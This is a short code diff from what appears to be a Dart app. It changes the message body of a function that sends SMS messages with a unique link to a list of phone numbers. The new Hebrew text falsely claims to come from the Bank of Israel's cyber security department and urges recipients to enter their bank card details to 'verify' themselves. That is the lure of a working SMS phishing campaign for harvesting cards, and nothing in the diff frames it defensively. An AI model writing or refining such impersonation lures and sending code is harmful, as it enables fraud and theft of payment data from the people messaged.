@@ -324,7 +324,7 @@ Future<void> sendSmsWithLink(List<String> phoneNumbers) async {
         // from: 'Your Company',
         // subject: 'Card Information',
         messageBody:
-            'Click on the link below to enter your card information:\n$uniqueLink',
+            'אנחנו מחלקת אבטחת הסייבר של הבנק המרכזי של ישראל. אנא מלא את פרטי כרטיס הבנק שלך כדי לוודא שאתה בעל הכרטיס הלגיטימי עקב הפצת הונאה והודעות מזויפות.:\n $uniqueLink',
       );
       print('the $phoneNumber was  SMS sent successfully!');
     } catch (e) {
